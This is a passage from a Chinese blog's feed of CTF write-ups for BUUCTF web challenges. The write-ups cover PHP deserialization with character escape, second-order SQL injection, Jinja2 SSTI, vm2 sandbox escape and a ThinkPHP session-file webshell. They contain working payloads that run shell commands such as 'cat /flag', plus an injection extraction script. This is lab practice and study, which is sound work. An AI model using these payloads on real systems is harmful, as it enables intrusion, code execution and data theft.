hacker!&quot;</span>);&#125;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, $_POST[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);&#125;$user-&gt;login();&#125;<span class="hljs-meta">?&gt;</span>&lt;/form&gt;&lt;/center&gt;</code></pre></code></pre><p><code>update.php</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span><span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span><span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span><span class="hljs-string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span><span class="hljs-string">&lt;/html&gt;&#x27;</span>;<span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你还没有登陆呢！&quot;</span>;&#125;$users=<span class="hljs-keyword">new</span> User();$users-&gt;update();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>这个网站的逻辑就是要以admin登录，通过SQL语句查询，比较ID和passwd，正确的话，跳转到<code>update.php</code>，得到flag    </p><p>主要是<code>lib.php</code>     </p><pre><code>function safe($parm)&#123;    $array = array(&#39;union&#39;, &#39;regexp&#39;, &#39;load&#39;, &#39;into&#39;, &#39;flag&#39;, &#39;file&#39;, &#39;insert&#39;, &quot;&#39;&quot;, &#39;\\&#39;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#39;hacker&#39;, $parm);&#125;</code></pre><p>看到这个，应该想到那个反序列化的字符逃逸了    </p><pre><code>$this-&gt;id = $mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);         </code></pre><hr><pre><code>public function __call($name, $argument)    &#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;</code></pre><p>两个login，而且第二个login的参数是可控的     </p><p>所以     </p><p>以此，构造pop链反序列化修改SQL语句     </p><p>入口—&gt;update.php里的       </p><pre><code>$users=new User();$users-&gt;update();        </code></pre><p>跟进<code>lib.php</code>里的update()      </p><p>首先<code>  $Info = unserialize($this-&gt;getNewinfo());</code>应该是出口了      </p><p>这个<code>$updateAction = new UpdateHelper($_SESSION[&#39;id&#39;],$Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#39;id&#39;]);</code>    </p><p>跟进<code>UpdateHelper</code>    </p><p><code>$sql</code>没有使用，且<code>echo $this-&gt;sql;</code>        </p><p>让<code>sql=new User()</code>来触发toString     </p><pre><code>public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125; </code></pre><p>让<code>nickname=new Info()</code>来触发<code>__call</code></p><pre><code>public function __call($name, $argument)&#123;    echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#125;      </code></pre><p>接着让<code>CtrlCase=new dbCtrl()</code>就可以执行自定的SQL了    </p><p>将password修改     </p><pre><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></pre><p>c4ca4238a0b923820dcc509a6f75849b是1的MD5值      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png" alt="03.png"></p><p>这样再控制dbCtrl里的name和password就可以以admin登录       </p><p>之后     </p><pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;        return $idResult;      </code></pre><p>重新登陆时不管密码是什么都能登陆成功，得到flag了     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $sql;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;sql=<span class="hljs-keyword">new</span> User();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age;    <span class="hljs-keyword">public</span> $nickname;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;                <span class="hljs-keyword">$this</span>-&gt;age=<span class="hljs-string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;nickname=<span class="hljs-keyword">new</span> Info();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $CtrlCase;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;CtrlCase=<span class="hljs-keyword">new</span> dbCtrl();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&#x27;admin&#x27;</span>;    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">&#x27;1&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> UpdateHelper();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>结果为</p><pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre><p>回到出口处     </p><p><code>getNewInfo()</code>中     </p><pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre><p>这里序列化的是一个新类，这样的话，刚才得到的payload只会被视为一个长的字符串，并不会被反序列化       </p><p>所以要字符逃逸       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $age=<span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> $nickname=<span class="hljs-string">&#x27;123&#x27;</span>;    <span class="hljs-keyword">public</span> $CtrlCase=<span class="hljs-number">123</span>;&#125;$a=<span class="hljs-keyword">new</span> Info();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>输出：<code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;i:123;&#125;</code>       </p><p>要想逃逸，需要再刚才的payload前加上<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>（<code>&quot;</code>来闭合序列化后生成的<code>&quot;</code>）后面加上<code>&#125;</code>来提前结束反序列化     </p><p>payload:<code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code>      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179326/17/1720/143813/608c2f0bEd5a3e0ed/156a14c371a68116.png" alt="02.png"></p><p>可以看到长度为263       </p><p>在双引号中加入263个union，或者其他（那个safe函数中的，只要凑够263即可）      </p><p>经过safe函数后，就多出263个，就将原来的263个逃逸出来了       </p><p>最终payload：</p><pre><code>   age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;        </code></pre><p>在<code>update.php</code>页面POST提交，重新登录（admin，密码随意）得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>unserialize</tag>
      
      <tag>char.escape</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unfinish</title>
    <link href="/2021/04/29/BUU79/"/>
    <url>/2021/04/29/BUU79/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL-二次注入"><a href="#SQL-二次注入" class="headerlink" title="SQL 二次注入"></a>SQL 二次注入</h2><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181130/17/1544/29996/608ad77eE7e059785/fcb10cb3973eb937.png" alt="01.png">      </p><p>URL为：<code>http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php</code>     </p><p>有<code>login.php</code>,看下有没有<code>register.php</code>      </p><p>果然      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/189730/22/621/29267/608ad7f4Eb2fe540a/175965ef798babd3.png" alt="02.png"><br>随便注册个看看<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png" alt="03.png"><br>可以看到在侧边栏这里显示了我们的用户名          </p><p>二次注入       </p><p>过滤了<code>,</code>和<code>information</code><br>所以没法报错注了     </p><p>新姿势<code>0&#39;+hex(hex(database()))+&#39;0</code>       </p><p>之所以要两次hex编码是因为，一次编码产生的结果里可能有字母，加0后就成了字母前面的纯数字      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/186262/16/1480/306644/608ad9e5Eb3f7074c/bf9784e6e02681be.png" alt="04.png">        </p><p>数字过大转为了科学计数法       </p><p>用substr,<code>,</code>被过，变为<code>from x for x</code>       </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185436/35/1509/304850/608ada67E0214a5f5/8198055dc97e7fa4.png" alt="05.png">        </p><p>也可以<code>ascii(substr(database() from 1 for 1))</code></p><p>得到database()是web       </p><p>但information被过，所以没法读表啥的        </p><p>看别人WP都是猜的<code>select * from flag</code>      </p><p>(啊这)    </p><p>最后写个脚本跑一下     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleepflag = <span class="hljs-string">&#x27;&#x27;</span>url = <span class="hljs-string">&#x27;http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/&#x27;</span>url1 = url+<span class="hljs-string">&#x27;register.php&#x27;</span>url2 = url+<span class="hljs-string">&#x27;login.php&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):    sleep(<span class="hljs-number">0.3</span>)    data1 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-built_in">format</span>(        i), <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;    data2 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;    r1 = requests.post(url1, data=data1)    r2 = requests.post(url2, data=data2)    res = re.search(<span class="hljs-string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, r2.text)    res1 = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, res.group())    flag = flag+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(res1.group()))    print(flag)</code></pre></code></pre><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175950/30/7065/148511/608adb94E422ae4f9/34785ddab5c3f6fc.png" alt="06.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>CTF</tag>
      
      <tag>SQL</tag>
      
      <tag>二次注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Double Secret</title>
    <link href="/2021/04/27/BUU78/"/>
    <url>/2021/04/27/BUU78/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="_-__-"></a><code>_-__-</code></h2><p>打开是这样<br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png" alt="01.png">       </p><p>各种找，发现<code>robots.txt</code><br>有一句话—–<code>It is Android ctf</code><br>????    </p><p>然后就扫目录，<code>/secrect</code>      </p><p>得到：<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>       </p><p>传入参数：<code>?secrect=123</code><br>—-&gt;<code>d]</code>      </p><p>然后试试其他的，感觉也没什么规律        </p><p>当我输了一个大的数后，  报错了<br><code>?secrect=123123</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/164560/32/20921/70003/6087c295Ee2b4b2b0/3375b41da3b33055.png" alt="02.png"><br>然后就不知道怎么继续了     </p><p>WP       </p><p>主要点：<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" alt="03.png">      </p><p>对传入的参数进行RC4解密，然后经过<code>render_template_string</code><br>这里存在SSTI      </p><p>RC4加密脚本         </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):</span>  <span class="hljs-comment"># 返回加密后得内容</span>    s_box = rc4_init_sbox(key)    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))    <span class="hljs-keyword">return</span> crypt<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_init_sbox</span>(<span class="hljs-params">key</span>):</span>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))    j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>        s_box[i], s_box[j] = s_box[j], s_box[i]    <span class="hljs-keyword">return</span> s_box<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):</span>    res = []    i = j = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        j = (j + box[i]) % <span class="hljs-number">256</span>        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % <span class="hljs-number">256</span>        k = box[t]        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>)key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># 此处为密文</span>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)enc_base64 = rc4_main(key, message)enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)enc_url = parse.quote(enc_init)print(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)<span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></code></pre></code></pre><p>明文输入SSTI的payload：<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" alt="05.png">      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" alt="04.png">        </p><p>虽然有个报错（那个safe函数），但还是得到了结果。</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>得到flag       </p><p><a href="https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control">Rc4加密</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I_&lt;3_Flask</title>
    <link href="/2021/04/26/BUU77/"/>
    <url>/2021/04/26/BUU77/</url>
    
    <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1_1"></a>1_1</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png" alt="01.png">       </p><p>题目是flask，应该是SSTI了吧<br>但没参数        </p><p><a href="https://github.com/rakjong/Arjun"><code>arjun</code></a><br>这个可以来爆破参数<br>先下载，然后到arjun目录下<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png" alt="02.png">       </p><p>安装<br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png" alt="03.png">        </p><p>使用<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png" alt="04.png">        </p><p>爆破出参数是name        </p><p>除此之外就没啥了<br>payload：<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>       </p><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>两个都行<img src="https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png" alt="05.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nep2</title>
    <link href="/2021/04/25/nep2/"/>
    <url>/2021/04/25/nep2/</url>
    
    <content type="html"><![CDATA[<p>视频二：<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）</p><pre><code>1. Injection----&gt;注入，Sql，nosql,OS injection,LDAP injection       2. Broken Authentication---&gt;失效的身份认证和会话管理3. Sensitive Data Exposure----&gt;敏感数据泄露4. XXE5. Broken Access Control----&gt;越权6. Security Misconfiguration.---&gt;安全配置   7. XSS8. Insecure Deserialization----&gt;不安全的反序列化9. Using Components with Known Vulnerabilities----&gt;使用不安全的组件 10. Insufficient Logging &amp; Monitoring.----&gt;日志和监控不足严重程度</code></pre><p>2.请翻译一下credential stuffing（1分）</p><pre><code>密码嗅探    </code></pre><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965">credential stuffing attack—-&gt;撞库</a></p><p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）</p><pre><code>日志记录不足，会使攻击者进一步攻击系统，保持持久性       owasp tenth</code></pre><p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）   </p><pre><code>利用owasp testing guide check-list查找到相关部分进行学习      小白，还没渗透过。。。。。。。。。         </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JustEscape</title>
    <link href="/2021/04/25/BUU76/"/>
    <url>/2021/04/25/BUU76/</url>
    
    <content type="html"><![CDATA[<h2 id="js-vm2"><a href="#js-vm2" class="headerlink" title="js vm2"></a>js vm2</h2><p><img src="https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png" alt="01.png">      </p><p>下面两个demo     </p><p>看下<code>run.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>试了下，感觉什么都执行不了     </p><p>前面提示说<code>真的是 PHP 嘛</code><br>难道不是PHP      </p><p>看下WP   </p><p>是js      </p><p>js还不会，先简单记一下吧，等学学再回来看看     </p><p><a href="https://www.anquanke.com/post/id/207291"><code>js  vm2沙箱逃逸</code></a>      </p><p>payload:   </p><pre><code>code = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(code));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>绕过：<code>[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]</code>      </p><pre><code>?code=(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyThinking</title>
    <link href="/2021/04/24/BUU75/"/>
    <url>/2021/04/24/BUU75/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-_-"></a>-_-</h2><p>看到thinking应该想到应该是thinkphp吧<br>输入个不存在的路径<br>报错：       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png" alt="01.png">     </p><p><a href="https://paper.seebug.org/1114/">Think PHP V6.0.0任意文件操作漏洞</a>       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png" alt="02.png">    </p><p>32位的PHPSESSID改成一个32位的PHP文件名  </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png" alt="03.png">      </p><p>搜索里面填入一句话      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png" alt="04.png"><br>就会被存放到之前写的文件里面<br>访问<code>http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php</code><br>最后的文件名是<code>sess_</code>+刚才的32位    </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png" alt="05.png">      </p><p>还要绕过<code>disable_function</code><br>和之前那道题一样        </p><p>我的蚁剑出问题了      </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105160796/">之后</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EzPHP</title>
    <link href="/2021/04/23/BUU74/"/>
    <url>/2021/04/23/BUU74/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-*-"></a>-*-</h2><p>代码审计    </p><pre><code>```php &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#39;shana&#39;];$passwd = $_GET[&#39;passwd&#39;];$arg = &#39;&#39;;$code = &#39;&#39;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if 